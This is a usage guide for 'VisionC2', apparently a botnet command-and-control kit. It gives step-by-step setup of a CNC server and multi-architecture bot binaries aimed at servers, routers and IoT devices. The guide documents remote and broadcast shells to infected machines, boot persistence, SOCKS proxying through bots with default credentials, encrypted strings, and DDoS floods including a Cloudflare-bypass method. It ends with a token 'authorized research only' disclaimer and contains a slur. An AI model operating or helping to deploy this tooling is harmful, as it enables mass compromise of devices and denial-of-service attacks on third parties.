
# ☾℣☽ VisionC2 Usage Guide

> Setup script handles config, encryption, patching, and building automatically.

if you can't set this up you're actually retarded
---

## 📋 Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen netcat

# Go 1.23+
wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
```

| Requirement | Minimum | Recommended |
|---|---|---|
| RAM / Storage | 512MB / 1GB | 2GB+ / 5GB+ |
| OS | Linux (any) | Ubuntu 22.04+ / Debian 12+ |
| Network | Port 443 open | + Admin port for split mode |

---

## 🚀 Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py   # Select [1] Full Setup
```

The wizard prompts for **C2 address**, **admin port** (default: 420), and **TLS cert details**. Output:

```
bins/              → 14 bot binaries (multi-arch)
cnc/certificates/  → server.crt + server.key
server             → CNC binary
setup_config.txt   → Config summary
```

To change C2 address later: `python3 setup.py` → option **[2]**. Redeploy bots afterward.

---

## 🖥️ Starting the CNC

```bash
./server              # TUI mode (default, recommended)
./server --split      # Telnet mode on admin port (default: 420)
```

**Split mode connect:** `nc YOUR_IP 420` → type `spamtec` → login.

**Background:** `screen -S vision ./server` (detach: `Ctrl+A, D`)

**First run** creates root user with random password — save it.

---

## 🎨 TUI Navigation

| Key | Action |
|---|---|
| `↑/↓` or `k/j` | Navigate |
| `Enter` | Select |
| `q` / `Esc` | Back / Cancel |
| `r` | Refresh |

### Dashboard Views

- **🤖 Bot List** — Live bot status. `Enter`=shell, `b`=broadcast shell, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
- **💻 Remote Shell** — Interactive shell to one bot. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall
- **📡 Broadcast Shell** — Command all bots. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots
- **⚡ Launch Attack** — Select method, target, port, duration → `l` to launch
- **📊 Ongoing Attacks** — Progress bars + time remaining. `s`=stop all
- **🧦 Socks Manager** — `s`=start socks, `x`=stop. Default: `socks5://visionc2:synackrst666@BOT_IP:1080`. Update creds: `!socksauth <user> <pass>`
- **📜 Connection Logs** — Bot connect/disconnect history

---

## 🤖 Bot Binaries

14 binaries in `bins/` covering amd64, x86, ARM64, ARMv7, MIPS, MIPSLE, and more (servers, routers, IoT, embedded).

| Command | Description |
|---|---|
| `!info` | System info |
| `!persist` | Boot persistence |
| `!reinstall` | Force re-download |
| `!lolnogtfo` | Kill + remove bot |

---

## ⚡ Attack Methods

**L4:** `!udpflood` `!tcpflood` `!syn` `!ack` `!gre` `!dns`
**L7:** `!http` `!https` `!cfbypass`

---

## 🔐 String Encryption

All sensitive strings are AES-128-CTR encrypted in `bot/config.go`. Manage with:

```bash
go run tools/crypto.go encrypt "string"           # Encrypt
go run tools/crypto.go encrypt-slice "a" "b" "c"   # Encrypt slice
go run tools/crypto.go decrypt <hex>                # Decrypt
go run tools/crypto.go generate                     # Regenerate all blobs
go run tools/crypto.go verify                       # Verify config.go
```

---

## 🔧 Quick Reference

| Task | Command |
|---|---|
| Rebuild bots only | `cd tools && ./build.sh` |
| Remove persistence | `sudo bash tools/cleanup.sh` |
| Regen TLS certs | `python3 setup.py` → [1], or `openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes` |
| Port 443 denied | `sudo setcap 'cap_net_bind_service=+ep' ./server` |
| Bots not connecting | Check firewall (`ufw allow 443/tcp`), verify C2 in `setup_config.txt`, test TLS (`openssl s_client -connect HOST:443`) |

---

**Docs:** [Architecture](Docs/ARCHITECTURE.md) · [Commands](Docs/COMMANDS.md) · [Changelog](Docs/CHANGELOG.md)

⚖️ **Authorized security research only.** Obtain written permission before testing any systems.

*VisionC2 - ☾℣☽*
